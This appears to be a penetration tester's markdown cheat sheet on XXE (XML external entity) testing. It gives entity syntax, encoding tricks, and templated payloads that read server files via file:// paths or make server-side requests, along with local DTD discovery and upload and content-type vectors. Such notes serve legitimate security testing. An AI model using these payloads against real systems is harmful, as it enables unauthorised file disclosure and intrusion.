# XXE
- Looking for fully controllable XML requests
- If partially controllable, look at [XInclude](#XInclude)

**General Format:**
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<stockCheck><productId>381</productId></stockCheck>
```

## Custom Entities
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Defining entity &myentity with string val -->
<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
<blah>
	&myentity;  <!-- Will return "my entity val" -->
</blah>
```

## Concatenating Entities
`<!DOCTYPE foo [ <!ENTITY path "<PATH>" > <!ENTITY url SYSTEM "<URL>&path;" ]>` -> `&url;`

## Useful Character HTML Encodings
**NOTE: REMEMBER TO ENCODE x TIMES IN x'th NESTED STRING**
**`&#x26;#x25;` -> `&#x25` -> `&`**
- % -> `&#x25;`
- ' -> `&#x27;`
- " -> `&#x22;`
- & -> `&#x26;`
## General Entities
- `<` - `&lt;` -> `<!ENTITY lt "&#38;#60;">``
- `>` - `&gt;` -> `<!ENTITY gt "&#62;">`
- `&` - `&amp;` -> `<!ENTITY amp "&#38;#38;">`
- `'` -  `&apos;` -> `<!ENTITY apos "&#39;">`
- `"` -  `&quot;` -> `<!ENTITY quot "&#34;">`


## External Entities
### External Requests
- `<!ENTITY <NAME> SYSTEM "<URL>" [NDATA <TYPE>]>` -> `&<NAME>;`
- `<!ENTITY <NAME> PUBLIC "failed" "<URL> [NDATA <TYPE>]"` -> `&<NAME>;`

### Directory Traversal
`<!DOCTYPE foo [ <!ENTITY <NAME> SYSTEM "file://<PATH>" > ]>` -> `&<NAME>;`

## Parameter Entities
### External Requests
`<!DOCTYPE foo [ <!ENTITY % <NAME> SYSTEM "<URL>" [NDATA <TYPE>]> %<NAME>; ]>`

### Directory Traversal
`<!DOCTYPE foo [ <!ENTITY % <NAME> SYSTEM "file://<PATH>" > %<NAME>; ]>`

## Existing DTD
*Exploit -> [Hybrid DTDs](3.%20Methodology/3.2%20Exploitation/XXE.md#Hybrid%20DTDs)*
**Find Library being used and see if DTD (probably) exists**
**Google!**
**Reference [here](https://packages.debian.org/search?searchon=contents&keywords=.dtd&mode=path&suite=stable&arch=any) and [here](https://packages.ubuntu.com/search?suite=disco&arch=any&mode=filename&searchon=contents&keywords=.dtd)**
**Methodology [here](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)**
```
<!DOCTYPE foo [  
<!ENTITY % local_dtd SYSTEM "file://<DTD PATH>">

<!-- Make query. Will Error if DTD does not exist -->
%local_dtd;  
]>
```

# XInclude
*Exploit -> [XInclude](3.%20Methodology/3.2%20Exploitation/XXE.md#XInclude)*
**For partially controlled documents**
**Fairly restrictive, but good to try**

# File Upload
*Exploit -> [File Upload](3.%20Methodology/3.2%20Exploitation/XXE.md#File%20Upload)*
**Upload XML, XInclude, or XML-based formates (DOCX, SVG, etc) to perform XXE**
- Try uploading XML as per above, and see what happens

# Modified Content Type
**Rare, but good to know. If confirmed, XXE as normal**
```
POST /action HTTP/1.0  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 7  
  
foo=bar
```

Is equivalent to:

```
POST /action HTTP/1.0  
Content-Type: text/xml  
Content-Length: 52  
  
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```